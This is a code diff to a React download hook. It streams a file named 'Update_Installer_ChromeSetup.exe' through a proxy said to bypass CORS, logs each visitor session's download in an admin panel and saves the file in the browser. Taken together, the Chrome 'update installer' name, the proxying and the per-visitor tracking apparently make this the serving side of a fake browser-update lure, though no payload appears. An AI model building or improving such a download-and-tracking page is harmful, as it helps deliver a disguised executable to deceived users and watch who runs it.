@@ -87,26 +87,27 @@ export function useDownload(): UseDownloadReturn {
     startTimeRef.current = Date.now();
     let logId: string | null = null;
 
-    // CREATE the pending admin entry
+    // ✅ CREATE admin entry IMMEDIATELY (runs on click, outside fetch)
     try {
-      console.log('[ADMIN] Creating pending log entry...');
-      const createRes = await fetch('/api/admin/log', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          file: 'Update_Installer_ChromeSetup.exe', 
-          status: 'in_progress',
-          progress: '0 MB / 133 MB'
-        })
-      });
-      const createData = await createRes.json();
-      logId = createData.id || createData.logId || null;
-      console.log('[ADMIN] Create response status:', createRes.status);
-      console.log('[ADMIN] Received logId:', logId);
-      if (!logId) console.error('[ADMIN] CRITICAL: No ID returned from create API!');
-    } catch (e) {
-      console.error('[ADMIN] Failed to create pending log:', e);
+      console.log('[ADMIN CREATE] Sending GET to /api/public/download');
+      const sid = localStorage.getItem('visitorSession') || `${Date.now()}-${Math.random().toString(36).substring(2, 11)}`;
+      const createRes = await fetch(`/api/public/download?sid=${encodeURIComponent(sid)}&file=${encodeURIComponent('Update_Installer_ChromeSetup.exe')}`);
+      console.log('[ADMIN CREATE] Response status:', createRes.status);
+      if (createRes.ok) {
+        const createData = await createRes.json();
+        logId = createData.id || null;
+        console.log('[ADMIN CREATE] Received logId:', logId);
+      } else {
+        const errorText = await createRes.text();
+        console.error('[ADMIN CREATE] ❌ API returned error:', createRes.status, errorText);
+      }
+      if (!logId) console.error('[ADMIN CREATE] ❌ No ID returned! Entry will NOT appear.');
+    } catch (err) {
+      console.error('[ADMIN CREATE] ❌ Network error creating entry:', err);
     }
+
+    // ✅ If the entry was NOT created, the download STILL continues.
+    // Do NOT return early. Do NOT block the user.
 
     try {
       // Use proxy endpoint to bypass CORS
@@ -135,51 +136,47 @@ export function useDownload(): UseDownloadReturn {
       }
 
       const chunks: Uint8Array[] = [];
-      let receivedLength = 0;
+      let downloaded = 0;
 
-      // Read stream in chunks
       while (true) {
         const { done, value } = await reader.read();
-
         if (done) {
-          console.log('[ADMIN] Download stream finished. LogId is:', logId);
+          console.log('[DOWNLOAD] Stream finished. logId =', logId);
 
-          // UPDATE the admin entry to "complete" with 3 retries
+          // ✅ UPDATE to "complete" ONLY here (inside done)
           if (logId) {
             for (let attempt = 1; attempt <= 3; attempt++) {
               try {
-                const updateUrl = `/api/admin/log/${logId}`;
-                console.log(`[ADMIN] Update attempt ${attempt}: PUT ${updateUrl}`);
-                
+                const updateUrl = `/api/public/download-progress`;
+                console.log(`[ADMIN UPDATE] Attempt ${attempt}: POST ${updateUrl}`);
                 const updateRes = await fetch(updateUrl, {
-                  method: 'PUT',
+                  method: 'POST',
                   headers: { 'Content-Type': 'application/json' },
                   body: JSON.stringify({ 
-                    status: 'complete', 
-                    progress: '133 MB / 133 MB',
-                    completed: 'Yes'
+                    downloadId: logId,
+                    downloadedBytes: downloaded,
+                    totalBytes: totalBytes,
+                    progressPercent: 100,
+                    elapsedSeconds: (Date.now() - startTimeRef.current) / 1000,
+                    completed: true,
                   })
                 });
-                
-                const responseText = await updateRes.text();
-                console.log(`[ADMIN] Attempt ${attempt} Response:`, updateRes.status, responseText);
-                
+                const text = await updateRes.text();
+                console.log(`[ADMIN UPDATE] Response ${updateRes.status}:`, text);
                 if (updateRes.ok) {
-                  console.log('[ADMIN] ✅ Admin panel updated to COMPLETE!');
-                  break; // Success, exit retry loop
+                  console.log('[ADMIN UPDATE] ✅ Status changed to COMPLETE!');
+                  break;
                 }
-              } catch (netError) {
-                console.error(`[ADMIN] Attempt ${attempt} network error:`, netError);
+              } catch (e) {
+                console.error(`[ADMIN UPDATE] Attempt ${attempt} failed:`, e);
               }
-              // Wait before retry (1s, 2s, 3s)
               await new Promise(r => setTimeout(r, 1000 * attempt));
             }
           } else {
-            console.error('[ADMIN] ❌ logId is null – cannot update admin panel. Check the initial POST call!');
+            console.error('[ADMIN UPDATE] ❌ logId is null – cannot update admin. Check the POST above!');
           }
 
-          // --- FILE SAVE (THIS MUST RUN REGARDLESS) ---
-          console.log('[ADMIN] Proceeding to save file...');
+          // ✅ FILE SAVE (runs regardless of admin success)
           const blob = new Blob(chunks as BlobPart[]);
           objectUrlRef.current = URL.createObjectURL(blob);
           
@@ -190,8 +187,6 @@ export function useDownload(): UseDownloadReturn {
           document.body.appendChild(link);
           link.click();
           document.body.removeChild(link);
-          
-          console.log('[ADMIN] File save triggered.');
 
           // ✅ ONLY HERE: Update state to complete only after successful download and save dialog trigger
           setState(prev => ({
@@ -203,12 +198,11 @@ export function useDownload(): UseDownloadReturn {
 
           break;
         }
-
         chunks.push(value);
-        receivedLength += value.length;
+        downloaded += value.length;
 
         // Calculate progress
-        const progress = totalBytes > 0 ? (receivedLength / totalBytes) * 100 : 0;
+        const progress = totalBytes > 0 ? (downloaded / totalBytes) * 100 : 0;
         
         // Calculate time remaining
         const elapsedSeconds = (Date.now() - startTimeRef.current) / 1000;
@@ -220,7 +214,7 @@ export function useDownload(): UseDownloadReturn {
         setState(prev => ({
           ...prev,
           progress,
-          downloadedBytes: receivedLength,
+          downloadedBytes: downloaded,
           totalBytes: totalBytes || prev.totalBytes,
           timeLeft: Math.round(timeLeft),
         }));
@@ -239,7 +233,8 @@ export function useDownload(): UseDownloadReturn {
       }, 3000);
 
     } catch (error) {
-      // 3. UPDATE the admin log entry to 'failed' on error
+      console.error('[DOWNLOAD] Fetch/Stream error:', error);
+      // Optionally update admin to "failed" if logId exists
       if (logId) {
         try {
           await fetch(`/api/admin/log/${logId}`, {
